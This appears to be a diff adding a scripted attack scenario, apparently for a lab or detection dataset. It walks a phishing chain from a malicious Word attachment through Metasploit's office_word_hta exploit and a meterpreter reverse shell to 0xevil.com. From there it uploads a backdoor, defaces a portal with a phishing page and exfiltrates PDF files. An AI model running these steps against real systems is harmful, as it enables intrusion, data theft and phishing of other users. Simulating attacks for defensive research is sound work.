@@ -1,0 +1,39 @@
+Attack high-level description:
+The user logs in to Gmail, open the malicious email, with a malicious word file attachment. The user download and open the attached word file using a vulnerable Microsoft Word program. Word process connect back to 0xevil.com:8888, to fetch and inject meterpreter HTTPS payload to winword.exe process. The user use the gained access to gather information and to drop additional payload to the system (payload.exe). The malicious payload sweeps the system to collect high-profile PDF files, then it opens a HTTPS connection to 0xevil:8080 to exfiltrate the pdf files.
+The attacker then perform a lateral-movement to other systems via overwriting the portal index webpage with the phishing webpage. Other users access the portal website, and do as the phising webpage suggests, to download and execute the malicious payload. The executed payload similarly collect the targeted files and exfiltrate them to 0xevil.com:8080.
+
+
+Attack steps and commands:
+1- Start Metasploit exploit:
+use exploit/windows/fileformat/office_word_hta
+exploit
+set payload windows/meterpreter/reverse_https
+use exploit/multi/handler
+exploit
+
+2- Send the phishing email to the target.
+3- The user download the malicious word file, and the attacker gets a remote shell.
+
+4- Attacker performs the following shell commands using meterpreter shell and Windows console (i.e., cmd.exe):
+pwd (to show the current directory)
+ps (to list the active processes)
+getuid (to show the logged-in user information)
+ipconfig (to list the IP information)
+shell (spawn a shell (i.e., cmd.exe))
+> netstat -a
+> exit
+cd ../../../../.. (traverse back to C:\ drive)
+cd Users/admin
+ls (list the files)
+upload payload.exe (upload a backdoor)
+cat index.html (view the original web portal index)
+upload index.html (overwrite the web index with the phishing webpage)
+shell
+> payload.exe (run the payload to exfiltrate pdf files)
+> exit (kill the shell process)
+
+5 - The attacker receive the pdf files using the exfiltration server, which dedicate a folder per host to store the files.
+
+6 - Another user access portal.com, follows the phishing webpage instructions, finally, he/she download and execute the malicious payload.
+
+7- The pdf files from the second machine get exfiltrated to the attacker remote server.
